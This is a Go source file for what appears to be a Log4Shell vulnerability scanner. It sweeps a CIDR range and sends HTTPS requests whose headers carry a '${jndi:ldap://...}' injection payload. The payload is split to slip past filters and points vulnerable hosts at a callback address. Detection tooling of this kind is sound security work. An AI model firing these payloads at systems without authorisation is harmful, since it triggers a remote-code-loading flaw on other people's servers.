package main

import (
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// nolint: gochecknoglobals
var version = "dev"

func request(destCIDR string, destPorts string, callbackAddr string, listen bool) error {
	log.Printf("[i] Start scanning %s CIDR\n---------", destCIDR)

	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	client := &http.Client{
		Timeout:   time.Millisecond * 75,
		Transport: transport,
	}

	var (
		lh      string = "${jndi:ldap:"
		rh      string = "l4s}"
		payload string = fmt.Sprintf("%v//%v/%v", lh, callbackAddr, rh)
	)

	ports := strings.Split(destPorts, ",")

	_, ipv4Net, err := net.ParseCIDR(destCIDR)
	if err != nil {
		return err
	}

	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
	start := binary.BigEndian.Uint32(ipv4Net.IP)

	finish := (start & mask) | (mask ^ 0xffffffff)

	for i := start; i <= finish; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)

		for _, p := range ports {
			var url string = fmt.Sprintf("https://%v:%v", ip, p)

			log.Printf("[i] Checking %s\n", url)

			req, err := http.NewRequest("GET", url, nil)
			if err != nil {
				return err
			}

			req.Header.Set("User-Agent", payload)
			req.Header.Add("Bearer", payload)
			req.Header.Add("Authentication", payload)

			req.Header.Add("X-Requested-With", payload)
			req.Header.Add("X-Forwarded-For", payload)
			req.Header.Add("X-Api-Version", payload)

			response, err := client.Do(req)
			if err != nil {
				// ignore
				continue
			}
			defer response.Body.Close()
		}
	}

	log.Printf("[i] Completed scanning of CIDR %s\n", destCIDR)
	if listen {
		log.Println("[i] Waiting for incoming callbacks!")
		log.Println("[i] Use ctrl+c to stop the program.")
	}

	return nil
}

func main() {
	var (
		callbackAddr string
		destCIDR     string
		destPorts    string
		listen       bool
		wg           sync.WaitGroup
	)

	flag.StringVar(&callbackAddr, "caddr", "", "address to catch the callbacks (eg. ip:port)")
	flag.StringVar(&destCIDR, "cidr", "192.168.1.0/28", "subnet to scan (default 192.168.1.0/28)")
	flag.StringVar(&destPorts, "ports", "8080", "ports (comma separated) to scan (default 8080)")
	flag.BoolVar(&listen, "listen", false, "start a listener to receiving callbacks (default false)")

	flag.Parse()

	log.Printf("[i] Log4Shell Vulnerability Scanner %s\n---------", version)

	if listen {
		wg.Add(1)
		go startCatcher(callbackAddr, &wg)
	}

	err := request(destCIDR, destPorts, callbackAddr, listen)
	if err != nil {
		log.Fatal(err)
	}

	wg.Wait()
}
